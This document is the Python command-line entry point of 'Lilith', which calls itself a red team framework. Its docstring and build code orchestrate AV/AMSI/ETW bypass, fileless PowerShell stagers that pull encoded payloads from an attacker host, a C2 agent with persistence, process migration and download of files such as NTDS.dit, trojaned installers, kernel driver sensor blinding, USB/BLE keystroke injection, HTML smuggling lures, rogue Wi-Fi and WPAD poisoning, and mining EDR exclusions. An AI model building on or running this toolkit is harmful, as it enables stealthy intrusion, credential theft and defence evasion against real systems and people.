#!/usr/bin/env python3
"""
Lilith — polymorphic AV/AMSI bypass framework for authorized red team engagements.

Builds a randomized C runner, encodes .NET offensive tools, generates PowerShell
stagers, serves everything over a fake IIS HTTPS server, and records every C2
interaction to a SQLite engagement database for purple team review.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
QUICK START
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  lilith init                       Create engagement.yaml from template
  nano engagement.yaml              Set lhost, injection_profile, tools
  lilith build --all                Compile runner + encode tools + generate stagers
  lilith serve                      Start HTTPS server + C2 listener (records everything)
  # paste 10 lines from build --stager on target
  lilith c2 --list                  List active sessions
  lilith c2 --session <ID>          Open interactive REPL
  lilith engage --export md         Export full engagement report for purple team

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  init      Create engagement.yaml with all available options
  build     Compile runner / encode tools / generate stagers / delivery payloads
  serve     Start HTTPS payload server + C2 listener + engagement DB
  c2        Interact with active C2 agent sessions
  network   Network-level delivery: captive portal, WPAD poisoning, WebDAV LNK
  patch     Trojan a legitimate PE installer with the C2 stager shellcode
  xdr       Parse Cortex XDR agent_settings.db (exclusions, uninstall hash)
  engage    Query and export the engagement database for purple team reporting
  list      List all available offensive tools (✓ = binary found on disk)
  check     Verify build dependencies

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BUILD FLAGS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  --runner              Compile polymorphic C runner:
                          • Each build is unique — random XOR key, symbol names,
                            section names, Rich header, TimeDateStamp
                          • Evasion: indirect syscalls, ntdll unhook, module stomp,
                            ETW patch, AMSI bypass, PPID spoof, stack spoof, Ekko sleep
                          • Outputs: runner_c.dat (XOR-encoded PE) + C2 agent shellcode

  --tool NAME           Encode a single .NET tool → XOR+RC4 shellcode .enc file
                          • Wraps in donut (CLR host + Assembly.Load in-memory)
                          • No managed assembly ever touches disk on target
                          Example: lilith build --tool Rubeus

  --tools               Encode all tools defined in engagement.yaml at once

  --stager NAME         Generate the 10-line PowerShell stager for one tool:
                          • AMSI bypass (precompiled DLL, no csc.exe, no temp file)
                          • Script Block Logging bypass via reflection
                          • Invisible Unicode obfuscation on all .NET type names
                          • XOR-obfuscated strings (URL, verb, method names)
                          • SslStream fetch (no WinHTTP COM activation event)
                          • Prints exact lines to paste in Evil-WinRM / cmd.exe
                          Example: lilith build --stager Rubeus

  --stagers             Generate stagers for all currently encoded tools

  --all                 Full pipeline: runner → encode all tools → all stagers

  --c2-stager           Generate fileless C2 agent stager:
                          • Injects runner shellcode directly into memory — no PE on disk
                          • Agent polls C2 every 10–30s with jitter; runs in background
                          • Supports: shell commands, migrate, upload/download, screenshot,
                            persist, comhijack, wnfinject, fiberexec, byovdrun

  --shellcode FILE      Pack raw shellcode (.bin from msfvenom/Sliver/custom) into
                        .enc + stager — same delivery path as .NET tools
                          Example: lilith build --shellcode revshell.bin --name revshell

  --escalate POTATO     Build a SeImpersonate → SYSTEM escalation chain:
                          POTATO runs GodPotato/PrintSpoofer/JuicyPotato/RoguePotato,
                          escalates to SYSTEM, then self-downloads and runs the
                          SYSTEM-level payload via a hidden PowerShell subprocess
    --system-tool NAME  The tool to execute as SYSTEM after escalation
                          Example: lilith build --escalate GodPotato --system-tool Mimikatz

  --byovd               Build the BYOVD kernel sensor-blinding kit:
                          • Interactive GUI .exe + fileless shellcode .enc variant
                          • Drivers: RTCore64, gdrv, WinRing0x64
                          • Operations: ETW-TI disable, OB callback removal,
                            PspNotify callback removal, DKOM hide, PPL strip, DSE patch
    --byovd-driver PATH Kernel driver .sys path baked into byovd.enc
                          (must be uploaded to target disk before byovdrun)
    --byovd-ops OPS     Operations to enable at build time
                          Default: --etwti --remove-ob-callbacks --remove-callbacks

  --usb TOOL            Generate USB HID keystroke payloads for physical access:
                          • Rubber Ducky v1/v2 (payload.txt)
                          • Raspberry Pi Pico/CircuitPython (code.py)
                          • DigiSpark ATtiny85 (payload_digispark.ino)
                          • Plugs in, opens PowerShell, types stager, exits (~9–17s)
    --usb-device TYPE   duck | pico | digispark | teembed | all  (default: all)
    --usb-boot-delay MS USB enumeration + HID driver wait in ms  (default: 2000)
    --usb-out DIR       Output directory  (default: <workspace>/usb/)

  --ble [TOOL]          Generate BLE HID payload for wireless physical access:
                          • Bruce firmware: DuckyScript → copy to SD at /BadBLE/
                          • M5StickC Plus2: Arduino sketch → compile + flash
                          • Range ~10m, one-time pairing, button-triggered injection
                          • Bare --ble defaults to C2 agent stager
    --ble-device TYPE   m5stick | bruce | all  (default: m5stick)
    --ble-name NAME     BLE device name shown on pairing dialog
                          (default: Apple Wireless Keyboard)
    --ble-out DIR       Output directory  (default: <workspace>/ble/)


  --smuggle [TOOL]      HTML smuggling → ISO → LNK delivery chain:
                          • Browser downloads ISO via HTML blob URL (no server request)
                          • ISO auto-mounts; LNK visible in Explorer; one double-click fires
                          • Bare --smuggle defaults to C2 agent stager
    --smuggle-lure THEME Lure page theme: update | invoice | doc | setup
    --smuggle-lnk NAME  LNK display name inside ISO
    --smuggle-iso NAME  ISO filename shown in browser download bar

  --wasm                Build WebAssembly browser dropper:
                          • Wraps the compiled runner PE in a .wasm module (AV evasion)
                          • .wasm on disk contains only valid WASM bytecode — no PE magic,
                            no x64 opcodes, no shellcode patterns detectable by AV
                          • Generates wasm_loader.html: target visits URL → JS instantiates
                            WASM, decrypts PE in WASM linear memory, triggers .exe download
                          • WASM XOR key is independent from the runner XOR key
    --wasm-exe NAME     Filename for the downloaded .exe (default: WindowsSecurityUpdate.exe)
    --wasm-title TITLE  HTML lure page title (default: Windows Security Update)

  --ntlm-trigger        Generate NTLM coercion trigger files:
                          • .url (Internet Shortcut), .scf (Shell Command File),
                            .searchConnector-ms (Search Connector)
                          • Auto-authenticate to attacker SMB on folder browse/open
                          • Feed captures to hashcat/Responder for NTLM relay
    --ntlm-out DIR      Output directory  (default: <workspace>/ntlm_trigger/)

  --lolbin MODE         No-PowerShell stager for PS-blocked environments:
                          mshta     → .hta file run via mshta.exe (VBScript, XOR obfuscated)
                          regsvr32  → .sct scriptlet via regsvr32 Squiblydoo (HTTP only)
                          msbuild   → .xml proj file via msbuild.exe (inline C# shellcode)
                          all       → generate all three
                          Each output includes the exact invoke command.

  --ads [TOOL]          Stage payload in NTFS ADS + generate offline loader pair:
                          • ads_plant_<hex>.ps1: downloads .enc from C2 via SslStream,
                            writes raw bytes to an ADS of a signed system binary
                            (no standalone payload file on disk)
                          • ads_load_<hex>.ps1: reads from ADS, two-layer XOR decodes,
                            injects via compiled inject DLL — no network required
                          • Bare --ads defaults to C2 agent shellcode
                          • ADS survives standard dir/Explorer enumeration; needs
                            dir /r or Streams.exe to find
    --ads-host FILE     ADS host file path (default: randomised signed system binary)
    --ads-stream NAME   ADS stream name (default: randomised)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
C2 FLAGS  (lilith c2 ...)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  --list                List active sessions (ID, host, pending tasks, last seen)
  --session ID          Session to interact with
                          Without other flags: opens interactive REPL
  --cmd CMD             One-shot command — push task, wait for result, print, exit
  --timeout SEC         Result wait timeout in seconds  (default: 50)
  --migrate [PROC]      Inject agent into another process via priority pool:
                          svchost → RuntimeBroker → explorer → dllhost → sihost ...
                          Optional: specify target name, e.g. --migrate explorer.exe
  --persist TYPE        Install persistence via active agent session:
                          run      → HKCU Run key (fires at next user logon)
                          schtask  → Scheduled task (fires at logon, HighestAvailable)
                          wmi      → WMI CommandLine Consumer (fires on explorer.exe start)
                          wer      → WER-masked SYSTEM task in
                                     \\Microsoft\\Windows\\Windows Error Reporting\\
                                     (fires at boot, requires admin)
                          All embed payload as base64 -enc; no plaintext in registry/WMI
  --kill SID            Remove a session from the server registry (use after migration)

  File operations (agent must be running with download/upload/screenshot support):
  --upload LOCAL REMOTE Stage LOCAL file on the C2 server, push upload task to agent
                          Agent fetches the file and writes it to REMOTE path on target
                          Example: lilith c2 --session abc --upload rtc.sys C:\\Temp\\rtc.sys
  --download REMOTE     Pull REMOTE file from target via agent (50 MB limit)
                          Binary data returned as _BIN_B64, decoded and saved locally
                          Example: lilith c2 --session abc --download C:\\Windows\\NTDS\\NTDS.dit
  --screenshot          Capture target desktop via GDI, save as BMP
                          Example: lilith c2 --session abc --screenshot --out desktop.bmp
  --out FILE            Output path for --download / --screenshot
                          Default: basename of remote path, or screenshot.bmp

  REPL meta-commands (inside the interactive shell):
    !persist wmi|run|schtask   Install persistence without leaving REPL
    !timeout <sec>             Adjust how long to wait for a task result
    !kill                      Kill current session and exit REPL
    exit / quit                Leave REPL (session remains alive on target)

  Built-in agent directives (type directly in REPL or --cmd):
    migrate [proc.exe]         Migrate to another process
    pid <proc.exe>             Resolve PID of a running process
    wnfinject <pid>            Inject via WNF subscription (no new thread object)
    fiberexec                  Re-inject via fiber on current thread
    comhijack <dll> <clsid>    Register COM server hijack in HKCU
    byovdrun [/path/enc]       Fetch + inject BYOVD shellcode in-memory
    upload <url> <dest>        Fetch raw bytes from URL, write to dest path on target
    download <path>            Read file from target disk, return base64
    screenshot                 Capture screen as BMP, return base64

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NETWORK FLAGS  (lilith network ...)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  captive               Rogue WiFi AP + captive portal delivery:
                          • hostapd creates a rogue AP with the target SSID
                          • dnsmasq serves DHCP; all DNS → attacker IP
                          • Captive detection triggers browser → lure page → stager
    --iface IFACE       Wireless interface for rogue AP (e.g. wlan1)
    --ssid SSID         SSID to advertise  (default: Corp_Guest)
    --cap-port PORT     HTTP port for captive portal  (default: 80)

  wpad                  WPAD poisoning + HTTP injection proxy:
                          • Serves wpad.dat pointing all traffic through attacker proxy
                          • Proxy injects inject.js into every unencrypted HTTP response
                          • Targets browsing HTTP sites get the stager automatically
    --pac-port PORT     Port to serve wpad.dat  (default: 80)
    --proxy-port PORT   Injecting proxy port  (default: 8080)

  webdav                WebDAV server for search-ms: LNK delivery:
                          • Hosts a .lnk payload via a minimal PROPFIND/GET WebDAV server
                          • Prints a search-ms: URI to deliver (email, chat, HTML href)
                          • When target clicks URI, Explorer opens search-results view
                            showing the LNK — one double-click fires the payload
    --lnk-path FILE     Path to .lnk payload  (default: <workspace>/payload.lnk)
    --lnk-name NAME     Display name shown in Explorer search results
                          (default: Critical Update)
    --webdav-port PORT  HTTP port for WebDAV server  (default: webdav_port in config)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PATCH FLAGS  (lilith patch ...)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Trojan a legitimate PE installer: shellcode executes silently in a background
  thread while the original program runs normally. No new process spawned.
  AddressOfEntryPoint is redirected to a PEB-walk shim; original OEP jumps back.

  --target EXE          Legitimate PE to backdoor (not modified in place)
  --output EXE          Output path for the backdoored PE
  --sc BIN              Pre-built raw shellcode (skip donut step)
  --section NAME        PE section name override (randomised if omitted)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
XDR FLAGS  (lilith xdr ...)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Parse a Cortex XDR agent_settings.db (LevelDB directory pulled from target):
    • Uninstall password hash + salt → hashcat command (mode 10900 SHA-512)
    • DLL/PE path exclusions → drop payload there, scan bypassed
    • Child-process chain exclusions → spawn from excluded parent
    • Memory protection status → choose injection technique accordingly
    • Trusted signer CNs → code-sign bypass vector
    • Cross-references findings against Lilith capabilities

  --parse DB_DIR        Path to the agent_settings.db directory
                          Typical location on target:
                          C:\\ProgramData\\Cyvera\\LocalSystem\\Persistence\\agent_settings.db

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ENGAGE FLAGS  (lilith engage ...)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Queries the SQLite engagement database (auto-created by 'lilith serve').
  Records sessions, every task dispatched, every result received, file transfers,
  credential detections, and all C2 events — survives server restarts.

  (no flags)            Print session summary table
  --list-tasks          List all dispatched tasks with ATT&CK technique mapping
  --session SID         Filter --list-tasks to one session
  --tag SID LABEL       Annotate a session (hostname, username, role)
                          Example: lilith engage --tag abc123 "WS01\\\\jsmith (DA)"
  --add-note TID TEXT   Attach an operator note to a specific task result
  --export json         Export complete engagement data as JSON
  --export md           Export as Markdown report:
                          • Executive summary (sessions, tasks, techniques)
                          • Full task timeline with ATT&CK technique links
                          • Collapsible output blocks for every result
                          • Credential capture section (hashes, plaintext, Kerberos)
                          • ATT&CK technique coverage matrix with Mitre.org links
                          • Event log (file serves, uploads, downloads, screenshots)
  --out FILE            Output file for --export
                          (default: engagement_report.json / engagement_report.md)
"""

import argparse
import json
import os
import shutil
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.config   import load_config, create_default_config
from core.workspace import Workspace
from builders.encoder import (
    encode_tool, find_tool, find_tool_icase, list_tools, resolve_params,
    TOOL_CATALOG, is_dotnet_assembly,
)
from builders.stager  import generate_stager, generate_escalation_chain_params
from builders.runner  import build_runner, build_runner_sc, build_runner_sc_c2
from builders.byovd   import build_byovd, build_byovd_sc
from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES
from builders.nfc_tag  import build_nfc_payload
from builders.smuggle    import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES, load_inject_js
from builders.ntlm_trigger import build_ntlm_triggers
from server.https_server import start_server, get_c2_sessions, _c2_push_task, _c2_get_result, set_engage_db


# ── helpers ────────────────────────────────────────────────────────────────────

def _read_runner_key(ws: Workspace) -> int:
    """Read the XOR key used to encode runner_c.dat. Falls back to legacy 0x5A."""
    meta = ws.path("runner_c.meta")
    if os.path.exists(meta):
        with open(meta) as f:
            return json.load(f).get("xor_key", 0x5A)
    return 0x5A


def _write_runner_key(ws: Workspace, key: int) -> None:
    with open(ws.path("runner_c.meta"), "w") as f:
        json.dump({"xor_key": key}, f)


def _stager_kwargs(cfg: dict, ws: Workspace, runner_key: int | None = None) -> dict:
    if runner_key is None:
        runner_key = _read_runner_key(ws)
    runner_dat = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
    return dict(
        lhost               = cfg.get("lhost", "10.10.14.1"),
        port                = cfg.get("http_port", 8443),
        injection_profile   = cfg.get("injection_profile", "RuntimeBroker.exe"),
        output_capture      = True,
        use_https           = True,
        sni_host            = cfg.get("sni_host", "assets.msn.com"),
        url_prefix          = cfg.get("url_prefix", "/cdn/static/v3"),
        callback_path       = cfg.get("callback_path", "/api/diagnostics/v1/telemetry"),
        jitter_min_ms       = cfg.get("jitter_min_ms", 1500),
        jitter_max_ms       = cfg.get("jitter_max_ms", 6000),
        user_agent          = cfg.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"),
        runner_xor_key      = runner_key,
        runner_dat_filename = runner_dat,
    )


def _encode_tool_with_cfg(
    tname:           str,
    cfg:             dict,
    ws:              Workspace,
    override_params: str | None = None,
) -> bool:
    """Encode a single tool using params from engagement config or catalog defaults.
    Substitutes LHOST in params before encoding.
    override_params, if given, takes priority over config and catalog defaults."""
    if override_params is not None:
        params = override_params
    else:
        tool_cfg = cfg.get("tools", {}).get(tname, {})
        params   = tool_cfg.get("params") if isinstance(tool_cfg, dict) else None
        if params is None:
            entry  = TOOL_CATALOG.get(tname, {})
            params = entry.get("default_params")
    params = resolve_params(params, cfg.get("lhost", "10.10.14.1"))

    binary = find_tool(tname)
    if not binary:
        print(f"[!] Tool binary not found: {tname}")
        return False

    enc_filename = ws.alloc_enc_name(tname)
    enc_out = ws.path(enc_filename)
    ok = encode_tool(binary, params, enc_out)
    if ok:
        clr = is_dotnet_assembly(binary)
        ws.set_tool_meta(tname, {"clr": clr, "args": params or ""})
    return ok


# ── subcommands ────────────────────────────────────────────────────────────────

def cmd_init(args, cfg, ws):
    create_default_config()


def cmd_build(args, cfg, ws):
    did_something = False
    lhost = cfg.get("lhost", "10.10.14.1")
    port  = cfg.get("http_port", 8443)

    # ── Runner ────────────────────────────────────────────────────────────────
    if args.runner or args.all:
        runner_dat_name = ws.alloc_enc_name("__runner_dat__")
        out = ws.path(runner_dat_name)
        ok, runner_key = build_runner(
            output_dat        = out,
            injection_target  = cfg.get("injection_profile", "RuntimeBroker.exe"),
            sni_host          = cfg.get("sni_host", "assets.msn.com"),
            user_agent        = cfg.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"),
            c2_host           = cfg.get("lhost", "10.10.14.1"),
            c2_port           = cfg.get("http_port", 8443),
            c2_cb_path        = cfg.get("callback_path", "/api/diagnostics/v1/telemetry"),
            c2_https          = True,
            c2_jitter_min_ms  = cfg.get("c2_jitter_min_ms", 10000),
            c2_jitter_max_ms  = cfg.get("c2_jitter_max_ms", 30000),
            # Task 13: domain fronting (optional — set front_host in engagement.yaml)
            front_host        = cfg.get("front_host"),
            allow_vm          = cfg.get("allow_vm", True),
            keep_exe          = True,
        )
        if not ok:
            sys.exit(1)
        _write_runner_key(ws, runner_key)
        # Build fileless C2 agent SC (donut runner -agent) alongside the runner enc
        runner_exe_path = os.path.splitext(out)[0] + ".exe"
        if os.path.exists(runner_exe_path):
            c2_sc_name = ws.alloc_enc_name("__runner_sc_c2__")
            build_runner_sc_c2(runner_exe_path, ws.path(c2_sc_name))
        did_something = True

    # ── Encode tools ──────────────────────────────────────────────────────────
    tools_to_encode: list[str] = []
    if args.all or args.tools:
        tools_to_encode = list(cfg.get("tools", {}).keys())
    elif args.tool:
        tools_to_encode = [args.tool]

    for tname in tools_to_encode:
        override = getattr(args, "args", None) if (args.tool and tname == args.tool) else None
        _encode_tool_with_cfg(tname, cfg, ws, override_params=override)
        did_something = True

    # ── Generate stagers ──────────────────────────────────────────────────────
    stagers_to_gen: list[str] = []
    if args.all or args.stagers:
        stagers_to_gen = [
            t for t in cfg.get("tools", {}).keys()
            if ws.get_enc_name(t) and os.path.exists(ws.path(ws.get_enc_name(t)))
        ]
    elif args.stager:
        stagers_to_gen = [args.stager]

    runner_key      = _read_runner_key(ws)
    _runner_dat     = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
    runner_exe      = ws.path(os.path.splitext(_runner_dat)[0] + ".exe")
    has_runner      = os.path.exists(runner_exe)
    scheme      = "https"
    url_prefix  = cfg.get("url_prefix",    "/cdn/static/v3")
    cb_path     = cfg.get("callback_path", "/api/diagnostics/v1/telemetry")

    for tname in stagers_to_gen:
        enc_filename = ws.get_enc_name(tname)
        if not enc_filename or not os.path.exists(ws.path(enc_filename)):
            print(f"[!] No encoded artifact for {tname} — run: lilith build --tool {tname}")
            continue

        # Build per-tool runner shellcode (in-memory injection, no PE on disk)
        runner_sc_enc = None
        runner_sc_cb  = None
        if has_runner:
            import secrets as _sec
            token         = _sec.token_hex(8)
            tool_url      = f"{scheme}://{lhost}:{port}{url_prefix}/{enc_filename}"
            runner_sc_cb  = f"{scheme}://{lhost}:{port}{cb_path}/{token}"
            sc_enc_name   = _sec.token_hex(8) + "_sc.enc"
            if build_runner_sc(runner_exe, tool_url, runner_sc_cb, ws.path(sc_enc_name)):
                runner_sc_enc = sc_enc_name

        tool_meta  = ws.get_tool_meta(tname)
        is_clr     = tool_meta.get("clr", False)
        tool_baked = tool_meta.get("args", "") or None

        # Task 3: non-.NET native EXEs use the custom PE loader stager instead of donut.
        # This eliminates the donut CLR COM bootstrap sequence from the stager path.
        is_native_pe = not is_clr and runner_sc_enc is None

        stager_name = ws.alloc_stager_name(tname)
        out = ws.path(stager_name)
        generate_stager(
            tool_name              = tname,
            enc_filename           = enc_filename,
            output_path            = out,
            runner_sc_enc_filename = runner_sc_enc,
            runner_sc_cb_url       = runner_sc_cb,
            clr_mode               = is_clr,
            native_pe_mode         = is_native_pe,
            tool_args              = tool_baked if is_clr else None,
            **_stager_kwargs(cfg, ws, runner_key),
        )
        did_something = True

    # Clean up runner exe after all SCs are built
    if has_runner and stagers_to_gen:
        try:
            os.remove(runner_exe)
        except OSError:
            pass

    # ── Escalation chain ──────────────────────────────────────────────────────
    if args.escalate:
        if not args.system_tool:
            print("[!] --escalate requires --system-tool NAME")
            sys.exit(1)

        # Normalise potato name (case-insensitive lookup)
        potato_key = find_tool_icase(args.escalate)
        if not potato_key:
            print(f"[!] Unknown potato tool: {args.escalate}")
            print(f"    Available: GodPotato, PrintSpoofer, PrintSpoofer32, JuicyPotato, RoguePotato")
            sys.exit(1)

        # Accept catalog tools OR custom .enc files already in the workspace
        system_key      = find_tool_icase(args.system_tool)
        system_enc_name = ws.alloc_enc_name(system_key or args.system_tool)
        system_enc_path = ws.path(system_enc_name)

        if not system_key and not os.path.exists(system_enc_path):
            print(f"[!] Unknown system tool and no encoded artifact found for: {args.system_tool}")
            print(f"    Either use a catalog tool name or run: build --shellcode FILE --name {args.system_tool}")
            sys.exit(1)

        potato_binary = find_tool(potato_key)
        if not potato_binary:
            print(f"[!] Binary not found for {potato_key}")
            sys.exit(1)

        # Ensure system tool is encoded (catalog tools only — custom .enc already exists)
        if system_key and not os.path.exists(system_enc_path):
            print(f"[*] System tool not encoded yet — building {system_key}.enc")
            if not _encode_tool_with_cfg(system_key, cfg, ws):
                sys.exit(1)

        runner_key = _read_runner_key(ws)
        _esc_runner_dat = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
        if not os.path.exists(ws.path(_esc_runner_dat)):
            print("[!] Runner not found — build --runner first")
            sys.exit(1)

        print(f"\n[*] Escalation chain: {potato_key} → SYSTEM:{system_key or args.system_tool}")
        runner_dat_name_esc = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
        chain_params = generate_escalation_chain_params(
            potato_tool              = potato_key,
            lhost                    = lhost,
            port                     = port,
            system_tool_enc_filename = system_enc_name,
            url_prefix               = cfg.get("url_prefix", "/cdn/static/v3"),
            use_https                = True,
            runner_xor_key           = runner_key,
            runner_dat_filename      = runner_dat_name_esc,
        )

        chain_enc_name = ws.alloc_enc_name(f"{potato_key}_chain")
        chain_enc_path = ws.path(chain_enc_name)
        if not encode_tool(potato_binary, chain_params, chain_enc_path):
            sys.exit(1)

        chain_stager_name = ws.alloc_stager_name(f"{potato_key}_chain")
        chain_stager = ws.path(chain_stager_name)
        generate_stager(
            tool_name    = f"{potato_key}_chain",
            enc_filename = chain_enc_name,
            output_path  = chain_stager,
            **_stager_kwargs(cfg, ws, runner_key),
        )

        print(f"\n[+] Chain ready. Serve {chain_enc_name} + {system_enc_name} + runner_c.dat")
        print(f"    Run stager on target (SeImpersonate user) → {potato_key} escalates → SYSTEM self-injects {system_key or args.system_tool}")
        did_something = True

    # ── Raw shellcode packing ─────────────────────────────────────────────────
    if args.shellcode:
        if not args.name:
            print("[!] --shellcode requires --name (e.g. --name revshell)")
            sys.exit(1)
        if not os.path.exists(args.shellcode):
            print(f"[!] File not found: {args.shellcode}")
            sys.exit(1)
        from core.encoding import pack_enc
        with open(args.shellcode, "rb") as f:
            raw_sc = f.read()
        enc_filename = ws.alloc_enc_name(args.name)
        enc_out = ws.path(enc_filename)
        with open(enc_out, "wb") as f:
            f.write(pack_enc(raw_sc))
        size_kb = len(raw_sc) / 1024
        print(f"[+] {args.shellcode} → {enc_out} ({size_kb:.1f} KB shellcode)")
        runner_key = _read_runner_key(ws)
        stager_name = ws.alloc_stager_name(args.name)
        out = ws.path(stager_name)
        generate_stager(
            tool_name    = args.name,
            enc_filename = enc_filename,
            output_path  = out,
            **_stager_kwargs(cfg, ws, runner_key),
        )
        did_something = True

    # ── C2 agent stager ───────────────────────────────────────────────────────
    if getattr(args, "c2_stager", False):
        c2_sc_name = ws.get_enc_name("__runner_sc_c2__")
        if not c2_sc_name or not os.path.exists(ws.path(c2_sc_name)):
            print("[!] C2 agent shellcode not found — run: lilith build --runner first")
            sys.exit(1)
        c2_stager_name = ws.alloc_stager_name("__c2_agent__")
        c2_stager_path = ws.path(c2_stager_name)
        generate_stager(
            tool_name              = "c2_agent",
            enc_filename           = c2_sc_name,
            output_path            = c2_stager_path,
            runner_sc_enc_filename = c2_sc_name,
            runner_sc_cb_url       = None,
            **_stager_kwargs(cfg, ws),
        )
        print(f"\n[+] C2 agent stager ready (fileless — injects into existing process)")
        print(f"    Targets: svchost → RuntimeBroker → explorer → dllhost → sihost → ctfmon")
        print(f"    Fallback: self-inject into current PS process")
        print(f"    After running on target: lilith c2 --list  (session in ~30s)")
        did_something = True

    # ── BYOVD kit ─────────────────────────────────────────────────────────────
    if getattr(args, "byovd", False):
        byovd_out = ws.path("byovd.exe")
        build_byovd(byovd_out)

        # Fileless shellcode variant — driver path + ops baked in at build time.
        # The .sys driver still needs to be uploaded to disk on target first.
        driver_path = getattr(args, "byovd_driver", None) or r"C:\Windows\Temp\driver.sys"
        byovd_ops   = getattr(args, "byovd_ops",    None) or "--etwti --remove-callbacks --remove-ob-callbacks"
        enc_out = ws.path("byovd.enc")
        build_byovd_sc(driver_path, byovd_ops, enc_out)

        did_something = True

    # ── USB HID payload ───────────────────────────────────────────────────────
    if getattr(args, "usb", None):
        tname = args.usb
        stager_name = ws._load_manifest().get(f"stager_{tname}")
        if not stager_name:
            print(f"[!] No stager found for '{tname}' — run: lilith build --stager {tname}")
            sys.exit(1)
        scheme     = "https"
        url_prefix = cfg.get("url_prefix", "/cdn/static/v3")
        stager_url = f"{scheme}://{lhost}:{port}{url_prefix}/{stager_name}"
        usb_out    = getattr(args, "usb_out",        None) or ws.path("usb")
        usb_dev    = getattr(args, "usb_device",     "all")
        usb_boot   = getattr(args, "usb_boot_delay", 2000)
        build_usb_payload(stager_url, usb_out, device=usb_dev, boot_delay_ms=usb_boot)
        did_something = True

    # ── BLE HID payload (M5StickC Plus2) ─────────────────────────────────────
    if getattr(args, "ble", None) is not None:
        tname = args.ble or "__c2_agent__"
        stager_name = ws._load_manifest().get(f"stager_{tname}")
        if not stager_name:
            hint = "lilith build --c2-stager" if tname == "__c2_agent__" else f"lilith build --stager {tname}"
            print(f"[!] No stager found for '{tname}' — run: {hint}")
            sys.exit(1)
        scheme     = "https"
        url_prefix = cfg.get("url_prefix", "/cdn/static/v3")
        stager_url = f"{scheme}://{lhost}:{port}{url_prefix}/{stager_name}"
        ble_out    = getattr(args, "ble_out",  None) or ws.path("ble")
        ble_dev    = getattr(args, "ble_device", "m5stick")
        ble_name   = getattr(args, "ble_name",   "Apple Wireless Keyboard")
        build_ble_payload(stager_url, ble_out, device=ble_dev, ble_name=ble_name)
        did_something = True

    # ── NFC tag NDEF payload ──────────────────────────────────────────────────
    if getattr(args, "nfc", False):
        nfc_out  = getattr(args, "nfc_out", None) or ws.path("nfc")
        nfc_url  = getattr(args, "nfc_url", None)
        if not nfc_url:
            scheme  = "https"
            nfc_url = f"{scheme}://{lhost}:{port}/wasm_loader.html"
        build_nfc_payload(nfc_url, nfc_out)
        did_something = True

    # ── HTML Smuggling → ISO → LNK ────────────────────────────────────────────
    if getattr(args, "smuggle", None) is not None:
        tname = args.smuggle or "__c2_agent__"
        stager_name = ws._load_manifest().get(f"stager_{tname}")
        if not stager_name:
            hint = "lilith build --c2-stager" if tname == "__c2_agent__" else f"lilith build --stager {tname}"
            print(f"[!] No stager found for '{tname}' — run: {hint}")
            sys.exit(1)
        scheme     = "https"
        url_prefix = cfg.get("url_prefix", "/cdn/static/v3")
        stager_url = f"{scheme}://{lhost}:{port}{url_prefix}/{stager_name}"
        smuggle_out  = getattr(args, "smuggle_out",  None) or ws.directory
        smuggle_lure = getattr(args, "smuggle_lure", "update")
        smuggle_lnk  = getattr(args, "smuggle_lnk",  "Windows Security Update")
        smuggle_iso  = getattr(args, "smuggle_iso",  "WindowsSecurityUpdate.iso")
        build_smuggle_payload(
            stager_url, smuggle_out,
            lure     = smuggle_lure,
            lnk_name = smuggle_lnk,
            iso_name = smuggle_iso,
        )
        did_something = True

    # ── WASM browser dropper ─────────────────────────────────────────────────
    if getattr(args, "wasm", False):
        runner_dat_name = ws.get_enc_name("__runner_dat__")
        if not runner_dat_name:
            print("[!] Runner not built yet — run: lilith build --runner first")
            sys.exit(1)
        runner_dat_path = ws.path(runner_dat_name)
        if not os.path.exists(runner_dat_path):
            print(f"[!] Runner not found: {runner_dat_path} — run: lilith build --runner first")
            sys.exit(1)
        from builders.wasm_stage import build_wasm_dropper
